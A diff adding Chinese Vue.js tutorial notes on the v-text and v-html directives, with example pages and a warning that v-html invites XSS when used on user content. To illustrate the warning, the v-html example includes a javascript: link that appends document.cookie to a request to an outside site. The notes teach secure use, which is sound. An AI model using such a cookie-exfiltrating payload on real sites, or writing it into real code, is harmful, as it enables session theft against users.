@@ -2428,3 +2428,97 @@ v-for指令：
 </html>
 ```
 
+# 15、内置指令
+
+## 1.v-text指令
+
+作用：向其所在的节点中渲染文本内容
+
+与插值语法的区别：v-text会替换掉节点中的内容，{{xxx}}  则不会
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <!-- 引入vue -->
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>  
+    <!-- 准备好一个容器 -->
+     <div id="root">
+        <div>{{name}}</div>
+        <div v-text="name"></div>
+        <div v-text="str"></div>
+     </div>
+
+     <script type="text/javascript">
+        Vue.config.productionTip = false  //阻止vue在启动时生成生产提示
+
+        // 创建vue实例
+        const vm = new Vue({
+            el: '#root',  
+            data: {
+                name:'尚硅谷',
+                str:'<h3>你好</h3>'
+            }
+        })
+     </script>
+</body>
+</html>
+```
+
+## 2.v-html指令
+
+1. 作用：向指定节点中渲染包含Html结构的内容。
+
+2. 与插值语法的区别：
+
+​		v-html会替换掉节点中所有的内容，{{xxx}}  则不会
+
+​		v-html可以识别html结构
+
+3. 严重注意：v-html有安全性问题！！！
+
+   ​	在网站上动态渲染任意html是非常危险的，容易导致xss攻击
+
+   ​	一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上。
+
+   ```html
+   <!DOCTYPE html>
+   <html lang="en">
+   <head>
+       <meta charset="UTF-8">
+       <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       <title></title>
+       <!-- 引入vue -->
+       <script type="text/javascript" src="../js/vue.js"></script>
+   </head>
+   <body>  
+       <!-- 准备好一个容器 -->
+        <div id="root">
+           <div>{{name}}</div>
+           <div v-html="str"></div>
+           <div v-html="str2"></div>
+        </div>
+   
+        <script type="text/javascript">
+           Vue.config.productionTip = false  //阻止vue在启动时生成生产提示
+   
+           // 创建vue实例
+           const vm = new Vue({
+               el: '#root',  
+               data: {
+                   name:'尚硅谷',
+                   str:'<h3>你好</h3>',
+                   str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>链接</a>'
+               }
+           })
+        </script>
+   </body>
+   </html>
+   ```
+
+   
